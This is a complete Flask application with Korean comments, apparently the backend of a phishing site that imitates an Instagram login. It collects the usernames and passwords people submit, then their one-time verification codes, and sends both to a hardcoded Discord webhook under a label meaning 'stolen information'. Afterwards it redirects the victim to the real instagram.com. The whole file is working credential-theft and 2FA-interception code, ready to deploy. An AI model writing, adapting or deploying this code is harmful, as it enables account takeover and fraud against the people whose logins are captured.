from flask import Flask, render_template, request, redirect, url_for
import requests
import os

app = Flask(__name__)

# 당신의 웹훅 주소 (정확하게 입력하세요)
WEBHOOK_URL = "https://discord.com/api/webhooks/1334690461664186378/N8L8Y0XbT4tO17E_rE86GvK8vY-3D3S6T7U8V9W0X1Y2Z3A4B5C6D7E8F9G0"

@app.route('/')
def index():
    # templates/login.html 파일이 반드시 있어야 합니다.
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('id')
    password = request.form.get('pw')
    
    if username and password:
        # 데이터 유출
        payload = {
            "content": f"🚨 **[탈취 정보]**\nID: `{username}`\nPW: `{password}`"
        }
        try:
            requests.post(WEBHOOK_URL, json=payload)
        except:
            pass
        
        # templates/otp.html 파일이 반드시 있어야 합니다.
        return render_template('otp.html')
    
    return redirect(url_for('index'))

@app.route('/verify', methods=['POST'])
def verify():
    otp_code = request.form.get('auth_code')
    if otp_code:
        requests.post(WEBHOOK_URL, json={"content": f"🔑 **[인증번호]**: `{otp_code}`"})
        return redirect("https://www.instagram.com/")
    return redirect(url_for('index'))

if __name__ == '__main__':
    # Render 환경에 맞춰 포트 설정
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
